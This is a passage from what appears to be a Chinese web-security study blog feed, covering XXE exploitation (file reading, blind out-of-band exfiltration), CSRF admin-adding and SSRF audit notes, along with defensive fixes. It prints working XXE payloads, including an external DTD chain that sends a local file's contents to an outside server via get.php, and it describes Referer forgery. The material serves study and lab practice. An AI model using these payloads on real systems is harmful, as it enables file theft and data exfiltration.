src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131163832954.png" alt="image-20230131163832954"></p><p>已知利用伪协议不能固定目录，所以排除三种思路里面的这种绕过方法，且这个cms没有上传点，排除思路一，采用思路二（只有php低版本适用此payload）</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131165529965.png" alt="image-20230131165529965"></p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day41 xml&amp;xee&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</title>
      <link href="/2023/01/18/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/01/18/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="#知识点:"></a>#知识点:</h2><h4 id="思路点："><a href="#思路点：" class="headerlink" title="#思路点："></a>#思路点：</h4><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><h3 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="-XXE黑盒发现："></a>-XXE黑盒发现：</h3><blockquote><p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p><p>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p><p>3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</p></blockquote><h3 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="-XXE白盒发现："></a>-XXE白盒发现：</h3><blockquote><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p></blockquote><h5 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h5><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h5 id="XML-与-HTML-的主要差异："><a href="#XML-与-HTML-的主要差异：" class="headerlink" title="XML 与 HTML 的主要差异："></a>XML 与 HTML 的主要差异：</h5><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p><p>HTML 旨在显示信息 ，而 XML 旨在传输信息。</p><h5 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h5><h6 id="方案1-禁用外部实体"><a href="#方案1-禁用外部实体" class="headerlink" title="-方案1-禁用外部实体"></a>-方案1-禁用外部实体</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP:</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);`</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JAVA:</span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python：</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><h6 id="方案2-过滤用户提交的XML数据"><a href="#方案2-过滤用户提交的XML数据" class="headerlink" title="-方案2-过滤用户提交的XML数据"></a>-方案2-过滤用户提交的XML数据</h6><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p><h1 id="案例演示-amp-复现"><a href="#案例演示-amp-复现" class="headerlink" title="#案例演示&amp;复现"></a>#案例演示&amp;复现</h1><p>➢ XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等</p><p>➢ XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用</p><p>➢ XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计</p><h2 id="XML-amp-XXE-黑盒-原理-amp-探针-amp-利用-amp-玩法等"><a href="#XML-amp-XXE-黑盒-原理-amp-探针-amp-利用-amp-玩法等" class="headerlink" title="XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等"></a><strong>XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等</strong></h2><p>复现靶场：php_xxe</p><p>复现过程：</p><p>1.读取文件</p><p>访问php_xxe登录界面，随便输入账户名密码登录抓包</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130135004406.png" alt="image-20230130135004406"></p><p>抓包如下：<img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130135140107.png" alt="image-20230130135140107"></p><p>可以看出accept类型为xml，尝试用xml注入读取文件：</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140011820.png" alt="image-20230130140011820"></p><p>这里的&amp;test作为变量实现读取文件的功能，所以用户名那里要加上&amp;并保持变量名一致才可以实现，读到内容如下：</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140155920.png" alt="image-20230130140155920"></p><p>2.带外测试</p><p>在注释掉回显result代码后内容不会再显示:</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140424339.png" alt="image-20230130140424339"></p><p>采用带外测试：</p><p>构造语句测试判断有无漏洞：</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140713597.png" alt="image-20230130140713597"></p><p>dnslog平台有回响，说明存在xml漏洞只是无回显</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140638636.png" alt="image-20230130140638636"></p><p>所以采用解决方法如下：</p><p>外部引用实体dtd：</p><p>dtd是xml的一个实体文件，里面写的是xml的代码、</p><p>用来解决：1、拦截防护绕过问题</p><p>​    2、数据不回显的问题</p><p>实体引用：引用远程的evil2.dd文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8081/evil2.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil2.dtd：读取d:&#x2F;e.txt内容</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样，再有回显的情况下同样可以通过这种方法读取内容</p><p>若无回显：</p><p>构造数据包并发送，注意此处不能是&amp;test了，要是&amp;send才能实现远程访问读取，与test.dtd里面的send相对应</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://47.94.236.117/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>自己的服务器47.94.236.117上面创建一个test的dtd文件内容入下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以%file参数实现自己想要的功能，此处是实现文件读取</p><p>自己的服务器47.94.236.117创建get.php内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将读取到的内容写入file.txt</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130144922113.png" alt="image-20230130144922113"></p><p>（也就是说一共涉及有三个文件：get.php  test.dtd  file.txt）</p><p>其他协议玩法：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><h2 id="XML-amp-XXE-前端-CTF-amp-Jarvisoj-amp-探针-amp-利用"><a href="#XML-amp-XXE-前端-CTF-amp-Jarvisoj-amp-探针-amp-利用" class="headerlink" title="XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用"></a>XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用</h2><p>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试</p><p>ctf中的一题：<a href="http://web.jarvisoj.com:9882/">web.jarvisoj.com:9882</a></p><p>抓包后是json格式</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130150150776.png" alt="image-20230130150150776"></p><p>右击查看源代码，发现实际是xml的请求方式，XMLHttpRequest对象用于在后台与服务器交换数据</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130150314895.png" alt="image-20230130150314895"></p><p>更改请求数据格式：Content-Type的json为xml</p><p>并构造post的xml语句：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XML-amp-XXE-白盒-CMS-amp-PHPSHE-amp-无回显审计"><a href="#XML-amp-XXE-白盒-CMS-amp-PHPSHE-amp-无回显审计" class="headerlink" title="XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计"></a>XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计</h2><p>审计流程：</p><blockquote><p>1、漏洞函数simplexml_load_string</p><p>2、pe_getxml函数调用了漏洞函数</p><p>3、wechat_getxml调用了pe_getxml</p><p>4、notify_url调用了wechat_getxml</p></blockquote><p>访问notify_url文件触发wechat_getxml函数,构造Paylod测试</p><p>先尝试读取文件，无回显后带外测试：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://c7ultt.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130173132371.png" alt="image-20230130173132371"></p><p>然后带外传递数据解决无回显：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://47.94.236.117/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd的内容：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>1、搜索关键字对于白盒xml测试更好，因为xml存在于数据传输和接收的地方，太多，如果这样搜的话太模糊，搜索漏洞产生的关键字函数将会更容易找此类漏洞，可以在百度搜素xml的一些解析函数</p><p>2、测试漏洞没有回显有三种情况：</p><p>(1)xml注入payload有误</p><p>(2)有漏洞但是无回显</p><p>(3)不存在xml漏洞</p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day40 Web通用漏洞&amp;CSRF&amp;SSRF&amp;代码审计&amp;同源策略&amp;加载函数</title>
      <link href="/2023/01/18/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/"/>
      <url>/2023/01/18/Day40Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h2><p>1、CSRF-审计-复现测试&amp;同源策略</p><p>2、SSRF-审计-功能追踪&amp;函数搜索</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><p>CSRF全称：Cross-site request forgery，即，跨站请求伪造，也被称为 “One Click Attack” 或 “Session Riding”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。举个生活中的例子：就是某个人点了个奇怪的链接，自己什么也没输，但自己的qq号或其他的号就被盗了。即该攻击可以在受害者不知情的情况下以受害者名义伪造请求，执行恶意操作，具有很大的危害性。</p><h5 id="CSRF的攻击过程两个条件："><a href="#CSRF的攻击过程两个条件：" class="headerlink" title="CSRF的攻击过程两个条件："></a>CSRF的攻击过程两个条件：</h5><p>1、目标用户已经登录了网站，能够执行网站的功能。</p><p>2、目标用户访问了攻击者构造的URL。</p><h5 id="CSRF安全问题黑盒怎么判断："><a href="#CSRF安全问题黑盒怎么判断：" class="headerlink" title="CSRF安全问题黑盒怎么判断："></a>CSRF安全问题黑盒怎么判断：</h5><p>1、看验证来源不-修复</p><p>2、看凭据有无token–修复</p><p>3、看关键操作有无验证-修复</p><h5 id="CSRF安全问题白盒怎么审计："><a href="#CSRF安全问题白盒怎么审计：" class="headerlink" title="-CSRF安全问题白盒怎么审计："></a>-CSRF安全问题白盒怎么审计：</h5><p>同黑盒思路一样，代码中分析上述三看</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h5 id="SSRF黑盒可能出现的地方："><a href="#SSRF黑盒可能出现的地方：" class="headerlink" title="-SSRF黑盒可能出现的地方："></a>-SSRF黑盒可能出现的地方：</h5><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h5 id="SSRF白盒可能出现的地方："><a href="#SSRF白盒可能出现的地方：" class="headerlink" title="-SSRF白盒可能出现的地方："></a>-SSRF白盒可能出现的地方：</h5><p>1、功能点抓包指向代码块审计</p><p>2、功能点函数定位代码块审计</p><h5 id="SSRF常见安全修复防御方案："><a href="#SSRF常见安全修复防御方案：" class="headerlink" title="-SSRF常见安全修复防御方案："></a>-SSRF常见安全修复防御方案：</h5><p>1、禁用跳转</p><p>2、禁用不需要的协议</p><p>3、固定或限制资源地址</p><p>4、错误信息统一信息处理</p><h5 id="系列内容点："><a href="#系列内容点：" class="headerlink" title="#系列内容点："></a>#系列内容点：</h5><p>1、CSRF&amp;SSRF&amp;原理&amp;利用&amp;协议等</p><p>2、CSRF&amp;SSRF&amp;黑盒&amp;审计&amp;修复等</p><h5 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h5><p> ➢ 代码审计-CSRF-SCMSFH无验证</p><p> ➢ 代码审计-CSRF-ZBLOG同源策略</p><p> ➢ 代码审计-SSRF-Yzmcms功能&amp;函数</p><p><strong>复现</strong></p><p> <em><strong>➢ 代码审计-CSRF-SCMSFH无验证</strong></em></p><p>本地被攻击方开始：只有管理员admin</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119154652410.png" alt="image-20230119154652410"></p><p>用csrfTester生成文件index.html,将这个文件放到win7 phpstudy （相当于攻击方）</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119153118122.png" alt="image-20230119153118122"></p><p>本地（被攻击方）访问win7：（前提是后台登录状态并且是打开的状态）<img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119153857259.png" alt="image-20230119153857259"></p><p>跳转成了：</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119154011078.png" alt="image-20230119154011078"></p><p>再查看后台：</p><p>添加csrf复现成功</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119154100831.png" alt="image-20230119154100831"></p><p> <strong>➢ 代码审计-CSRF-ZBLOG同源策略</strong></p><p>本地添加管理员的时候，来源为如下</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119160022002.png" alt="image-20230119160022002"></p><p>用csrfTester捕捉数据包生成zblog.html放于win7</p><p>本地访问192.168.240.128&#x2F;zblog.html</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119160920584.png" alt="image-20230119160920584"></p><p>发现添加失败，原因是源代码中有检验来源refer</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119162334260.png" alt="image-20230119162334260"></p><p>于是本地采取抓包伪造来源：(真实环境下不会如此，因为被攻击方不可能会这样做)</p><p>原始数据包：</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119162849982.png" alt="image-20230119162849982"></p><p>refer更改为<a href="http://127.0.0.1/zblog/zb_system/cmd.php">http://127.0.0.1/zblog/zb_system/cmd.php</a></p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119163015226.png" alt="image-20230119163015226"></p><p>此处改为<a href="http://127.0.0.1无效/">http://127.0.0.1无效</a></p><p>只有改成<a href="http://127.0.0.1/zblog/zb_system/cmd.php?act=MemberPst%E6%89%8D%E6%9C%89%E6%95%88">http://127.0.0.1/zblog/zb_system/cmd.php?act=MemberPst才有效</a></p><p>改后放包：</p><p><img src="/../images/Day40-Web%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0/image-20230119164622203.png" alt="image-20230119164622203"></p><p>成功添加</p><p>真实环境下对于来源的检测可采取：</p><p>1、伪造-需要在代码数据包文件固定来源（用脚本）</p><p>2、尝试在网站寻找可上传的地方，上传数据包文件，取得当前同域名访问地址</p><p><strong>➢ 